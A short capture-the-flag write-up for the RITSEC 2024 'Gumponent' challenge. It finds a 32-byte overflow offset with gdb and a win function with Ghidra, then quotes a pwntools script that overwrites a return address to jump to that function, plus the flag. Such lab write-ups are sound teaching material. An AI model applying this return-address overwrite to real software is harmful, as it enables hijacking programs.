# The Gumponent

#### Description: Hey, Chase here. Some of us on the team think we've found a component of something Anthony was last working on. Its seen running on a server. Additionally, someone found a prototype. Do you can you dig into this and see if there is something on the server that could tell use more?

We were given a server address and the port. Also a file "test_gumponent" to try it locally. 

First, I ran the code in gdb and used peda to get the offset. The offset is 32. 

I had the offset, but I still needed the target address. 

Putting it through Ghidra we can see its stripped, but after looking through the code, we can see that there is a function at address 0x401230 that returns "Am4z1ng succe55: %s\n","__Try it 0n the r3mote server n0w!__"

So, 0x401230 is the target address. 

    # Solution from negasora https://github.com/negasora/Some-CTF-Solutions/blob/master/ritsec-24/gumponent/sol.py
    from pwn import *

    io = process("./test_gumponent")

    io.readuntil(b'is at ')
    glump_addr = int(io.readuntil(b',')[2:-1], 16)

    io.readuntil(b'is at ')
    next_addr = int(io.readline().strip()[2:], 16)



    print(f"{glump_addr:x}")
    print(f"{next_addr:x}")


    target = p64(0x401230)

    io.sendline(b'A'*(next_addr - glump_addr) + target)

    io.interactive()

    # RS{to_gump_or_not_to_gump}

next_addr - glump_addr = 32, the same as the offset. 

It was a basic buffer overflow.
